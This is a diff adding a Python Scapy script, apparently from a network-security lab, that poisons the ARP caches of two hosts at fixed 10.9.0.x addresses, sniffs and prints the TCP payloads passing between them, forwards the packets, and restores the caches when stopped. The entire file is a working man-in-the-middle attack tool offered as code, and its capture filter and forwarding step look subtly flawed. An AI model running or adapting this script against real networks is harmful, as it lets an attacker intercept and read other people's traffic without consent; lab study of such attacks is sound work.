@@ -1,0 +1,43 @@
+#!/usr/bin/env python3
+from scapy.all import *
+import re
+
+# IP and MAC addresses of the two target hosts (A and B) and the attacker (M)
+IP_A = "10.9.0.5"
+MAC_A = "02:42:0a:09:00:05"
+IP_B = "10.9.0.6"
+MAC_B = "02:42:0a:09:00:06"
+IP_M = "10.9.0.105"  # Attacker's IP (our machine)
+MAC_M = "02:42:0a:09:00:69"  # Attacker's MAC
+
+# Poison ARP cache of Host A and Host B
+def poison_arp_cache():
+    send(ARP(op=2, psrc=IP_B, pdst=IP_A, hwdst=MAC_A))
+    send(ARP(op=2, psrc=IP_A, pdst=IP_B, hwdst=MAC_B))
+    print("ARP cache poisoning done. Traffic is now redirected through the attacker's machine.")
+
+# Restore ARP cache of Host A and Host B
+def restore_arp_cache():
+    send(ARP(op=2, psrc=IP_A, pdst=IP_B, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=MAC_A), count=3)
+    send(ARP(op=2, psrc=IP_B, pdst=IP_A, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=MAC_B), count=3)
+    print("ARP cache restored to normal.")
+
+# Function to process and potentially modify intercepted packets
+def process_packet(pkt):
+    if pkt.haslayer(TCP) and pkt.haslayer(Raw):
+        # Print the packet payload for demonstration
+        print("Original data:", pkt[Raw].load.decode('utf-8', errors='ignore'))
+
+        # Forward the packet to the original destination
+        sendp(pkt, verbose=0)
+
+try:
+    poison_arp_cache()
+    # Filter for IP traffic between Host A and Host B
+    filter_exp = f"ip host {IP_A} and {IP_B}"
+    print("Starting MITM... Press CTRL+C to stop.")
+    sniff(filter=filter_exp, prn=process_packet, store=0)
+except KeyboardInterrupt:
+    restore_arp_cache()
+    print("MITM attack terminated. ARP cache restored.")
+
